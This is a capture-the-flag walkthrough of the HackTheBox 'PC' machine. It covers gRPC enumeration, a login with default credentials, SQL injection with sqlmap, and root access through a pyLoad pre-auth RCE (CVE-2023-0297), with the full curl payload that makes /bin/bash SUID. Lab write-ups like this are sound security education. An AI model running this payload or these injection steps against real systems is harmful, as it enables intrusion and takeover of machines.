  ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5860a245-8aa8-48a6-8582-b5b85d72b670)
  https://app.hackthebox.com/machines/PC

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I began the enumeration by performing a quick Rustscan on the target machine. However, I found only two open ports, 22 and 50051:

```bash
sudo rustscan -a 10.10.11.214 -- -sC -sV -vv -oN pc_nmap
```

```
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChKXbRHNGTarynUVI8hN9pa0L2IvoasvTgCN80atXySpKMerjyMlVhG9QrJr62jtGg4J39fqxW06LmUCWBa0IxGF0thl2JCw3zyCqq0y8+hHZk0S3Wk9IdNcvd2Idt7SBv7v7x+u/zuDEryDy8aiL1AoqU86YYyiZBl4d2J9HfrlhSBpwxInPjXTXcQHhLBU2a2NA4pDrE9TxVQNh75sq3+G9BdPDcwSx9Iz60oWlxiyLcoLxz7xNyBb3PiGT2lMDehJiWbKNEOb+JYp4jIs90QcDsZTXUh3thK4BDjYT+XMmUOvinEeDFmDpeLOH2M42Zob0LtqtpDhZC+dKQkYSLeVAov2dclhIpiG12IzUCgcf+8h8rgJLDdWjkw+flh3yYnQKiDYvVC+gwXZdFMay7Ht9ciTBVtDnXpWHVVBpv4C7efdGGDShWIVZCIsLboVC+zx1/RfiAI5/O7qJkJVOQgHH/2Y2xqD/PX4T6XOQz1wtBw1893ofX3DhVokvy+nM=
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPqhx1OUw1d98irA5Ii8PbhDG3KVbt59Om5InU2cjGNLHATQoSJZtm9DvtKZ+NRXNuQY/rARHH3BnnkiCSyWWJc=
|   256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBG1KtV14ibJtSel8BP4JJntNT3hYMtFkmOgOVtyzX/R
50051/tcp open  unknown syn-ack ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.91%I=7%D=5/21%Time=646A1688%P=x86_64-unknown-linux-gn
SF:u%r(NULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff
SF:\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Ge
SF:nericLines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\x
SF:ff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(
SF:GetRequest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\x
SF:ff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(
SF:HTTPOptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\
SF:xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r
SF:(RTSPRequest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff
SF:\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%
SF:r(RPCCheck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\x
SF:ff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(
SF:DNSVersionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
SF:?\0\0")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
SF:\0\0\0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff
SF:\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\
SF:0\0\0\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0
SF:\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\
SF:x08\0\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x0
SF:4\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x
SF:04\x08\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\
SF:0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04
SF:\x08\0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\
SF:0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04
SF:\x08\0\0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Upon visiting the webpage on port 50051, I noticed that it was running software other than a web application:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5d4d910a-fa88-4dba-8cd9-038adb2ea9f9)

I attempted to connect to the port using Netcat, but the connection was quickly dropped after running any command:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6788ec89-3e99-49f0-bd09-338eee2ef52b)

After multiple failed attempts to connect via port 50051, I researched the service running on that port and discovered that it was a gRPC service.

```
gRPC is designed to work with a variety of authentication mechanisms, making it easy to safely use gRPC to talk to other systems. You can use our supported mechanisms - SSL/TLS with or without Google token-based authentication - or you can plug in your own authentication system by extending our provided code.

gRPC also provides a simple authentication API that lets you provide all the necessary authentication information as Credentials when creating a channel or making a call.
```

I came across this [blog](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9) on Medium that explained the complete exploitation process of gRPC.

To establish a connection with the gRPC service, I downloaded 'grpccurl' from this [Github repo](https://github.com/fullstorydev/grpcurl/releases):

```bash
grpcurl -plaintext 10.10.11.214:50051 list
```

This listed two services:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2242e9ae-952c-4199-aea6-b7f75155869f)

I decided to enumerate the SimpleApp service and list its modules:

```bash
grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7939cc35-2ff8-4c63-9746-131b0ba911e1)

This revealed three modules within SimpleApp:

```
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

I attempted to use all three services but realized that an account or authentication token was required to access them:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/53109ad4-d31b-4ac2-b1ce-93745658dbba)

To interact with the gRPC service and provide data for creating or modifying our blog, I downloaded grpcui, which opens a user interface portal:

```bash
grpcui -plaintext 10.10.11.214:50051
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d7d2eeb9-a203-4eea-b52e-1a11828483cc)

This command opened the UI page directly in my browser:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2ba0c48b-5861-4fd5-ae5a-343559ad28c2)

Overall, the enumeration process involved identifying the gRPC service on port 50051, exploring available services and modules, and utilizing tools like grpccurl and grpcui to interact with the service.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Initial access:

I attempted to log in to the LoginUser portal using the default 'admin:admin' credentials and successfully gained access.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/269a897f-887b-4c5c-9c04-3481474a5246)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/627a58bb-f7de-4444-b88c-5901bdd9e6a4)

After logging in, I obtained the administrator's token and ID, which I used to retrieve additional information.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/02f99a8e-1b4d-458c-8c8d-544296765c42)

To capture the request, I sent it to Burp and saved the relevant part.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3f8f7236-0954-42d3-92a2-1348fe00d506)

Using the saved request, I ran SQLmap to extract more information from the database, successfully retrieving the user and password.

```bash
sqlmap -r grpc.req --level=5 --risk=3 --batch --dbs --dump 
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2a31f627-cb8a-4ad5-affd-3da6539c1b6d)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/38b2e9af-2709-406a-baac-555b5e9d059a)

With the credentials obtained from the database, I successfully logged in via SSH and obtained the user flag. (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7719660a-b032-49bc-999f-44a5ab1add2b)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

I began with manual enumeration and checked a few things:

  - I verified the sudo permissions, but it appears that 'Sau' cannot run sudo commands.
  - I examined SUID binaries, but found nothing helpful.
  - I ran Linpeas but didn't find any relevant information.

Next, I checked for running TCP connections and discovered a service listening on port 8000:

```bash
netstat -anot
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5226b513-6ea9-4853-8a45-aa8a520954b4)

I performed port forwarding via SSH and accessed the service on my local host:

```bash
ssh sau@10.10.11.214 -L 8000:127.0.0.1:8000 -N
```

I identified a service called 'pyload' running on port 8000. pyLoad is an open-source download manager written in Python and can be managed through a web interface:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e9ebf106-886c-4f46-9977-99856c48e912)

I attempted to bypass the login by performing an SQL injection, but it didn't work.

Then, I searched for possible exploits online and came across a blog on GitHub: [CVE-2023-0297_Pre-auth_RCE_in_pyLoad](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad).

Following the instructions in the blog, I made some changes to the proof-of-concept (POC) by replacing and adding 'chmod u+s /bin/bash' in URL-encoded format. I initiated a curl command:

```bash
curl -i -s -k -X 'POST' --data-binary 'jk=pyimport%20os;os.system("chmod%20u%2Bs%20%2Fbin%2Fbash");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' 'http://127.0.0.1:8000/flash/addcrypted2'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f3af3112-1d6e-4dea-a855-c1c6cfd2c3f4)

After executing the curl request, I checked for /bin/bash again and observed that a root-level bash was available. I executed 'bash -p' to open the root bash shell:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0f98c828-e18b-473f-ba38-c459e9a1fb84)

With the root shell, I was able to retrieve the root flag. (pwn3d! 🙂)







